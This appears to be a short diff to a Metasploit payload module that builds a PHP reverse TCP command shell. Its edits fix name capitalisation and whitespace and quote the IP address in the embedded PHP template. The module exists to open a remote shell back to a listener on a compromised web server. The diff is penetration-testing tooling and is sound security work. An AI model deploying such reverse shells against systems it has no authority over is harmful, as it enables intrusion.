@@ -23,7 +23,7 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'PHP Command Shell, Reverse TCP (via php)',
+			'Name'          => 'PHP Command Shell, Reverse TCP (via PHP)',
 			'Version'       => '$Revision$',
 			'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',
 			'Author'        => 'egypt',
@@ -59,17 +59,17 @@ module Metasploit3
 			port = datastore['LPORT']
 		end
 		exec_funcname = Rex::Text.rand_text_alpha(rand(10)+5)
-		
+
 		uri = "tcp://#{ipaddr}"
 		socket_family = "AF_INET"
 
 		if Rex::Socket.is_ipv6?(ipaddr)
 			uri = "tcp://[#{ipaddr}]"
 			socket_family = "AF_INET6"
-		end		
+		end
 
 		shell=<<-END_OF_PHP_CODE
-		$ipaddr=#{ipaddr};
+		$ipaddr='#{ipaddr}';
 		$port=#{port};
 		#{php_preamble({:disabled_varname => "$dis"})}
 
